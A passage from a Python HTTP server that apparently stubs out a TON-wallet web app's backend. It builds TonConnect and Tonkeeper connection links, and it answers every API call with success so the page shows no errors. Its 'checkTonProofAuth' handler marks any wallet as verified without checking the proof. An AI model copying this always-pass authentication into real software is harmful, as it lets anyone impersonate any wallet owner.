                (origin + "/tonconnect-manifest.json").encode()
            ).rstrip(b"=").decode()
            tc_link = (
                f"tc://v1/?id={payload}"
                f"&r=%7B%22manifestUrl%22%3A%22{origin}%2Ftonconnect-manifest.json%22%7D"
                f"&ret=back"
            )
            tk_link = (
                f"https://app.tonkeeper.com/ton-connect"
                f"?v=2&id={payload}"
                f"&r=%7B%22manifestUrl%22%3A%22{origin}%2Ftonconnect-manifest.json%22%7D"
                f"&ret=back"
            )
            self.send_json({
                "ok": 1,
                "qr_link": tc_link,
                "link": tk_link,
                "expire_after": 300,
                "can_retry": True,
            })
            return

        # TON wallet — accept connection, mark as verified
        if method == "checkTonProofAuth":
            self.send_json({"ok": 1, "verified": True})
            return

        if method == "checkWallet":
            self.send_json({"ok": 1})
            return

        if method == "tonLogOut":
            self.send_json({"ok": 1})
            return

        # All other API calls — return ok so no JS errors appear
        self.send_json({"ok": 1})


class ReusableHTTPServer(http.server.HTTPServer):
    allow_reuse_address = True

if __name__ == "__main__":
    server = ReusableHTTPServer(("0.0.0.0", 5000), Handler)
    print("Server running on port 5000")
    server.serve_forever()
